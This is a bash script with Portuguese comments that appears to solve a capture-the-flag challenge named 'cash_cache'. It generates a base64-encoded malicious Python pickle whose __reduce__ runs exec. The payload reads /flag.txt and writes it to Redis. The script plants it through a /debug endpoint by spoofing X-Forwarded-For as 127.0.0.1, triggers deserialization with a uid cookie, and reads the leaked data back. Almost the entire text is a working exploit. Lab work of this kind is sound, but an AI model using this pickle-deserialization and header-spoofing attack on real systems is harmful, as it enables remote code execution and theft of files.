#!/usr/bin/env bash
set -euo pipefail

MYUID="${MYUID:-}"
if [[ -z "${MYUID}" ]]; then
  echo "Defina MYUID (valor do cookie uid)"; exit 1
fi

echo "[*] Gerando payload malicioso (pickle -> executa leitura de /flag.txt e grava em 'leak')..."
DATA_URL_MAL="$(python3 - <<'PY'
import base64, pickle, builtins, urllib.parse
code = r"""
import redis
r = redis.Redis(host='cache-storage', port=6379, encoding='utf-8', decode_responses=True)
try:
    data = open('/flag.txt','r').read()
except Exception as e:
    data = f'ERR:{e}'
r.set('leak', data)
"""
class Evil:
    def __reduce__(self):
        return (builtins.exec, (code,))
print(urllib.parse.quote(base64.b64encode(pickle.dumps(Evil())).decode(), safe=''))
PY
)"

echo "[*] Gravando via /debug (interno, com X-Forwarded-For terminando em 127.0.0.1)..."
docker exec -i cash_cache-backend-1 sh -lc \
  'curl -s "http://127.0.0.1:3000/debug?uid='"$MYUID"'&data='"$DATA_URL_MAL"'" \
    -H "X-Forwarded-For: 8.8.8.8, 127.0.0.1" | cat'

echo "[*] Disparando a desserialização (requisição com cookie uid)..."
curl -s -H "Cookie: uid=${MYUID}" http://localhost:5000/ >/dev/null

echo "[*] Lendo a flag do Redis..."
docker exec -i cash_cache-cache-storage-1 redis-cli GET leak
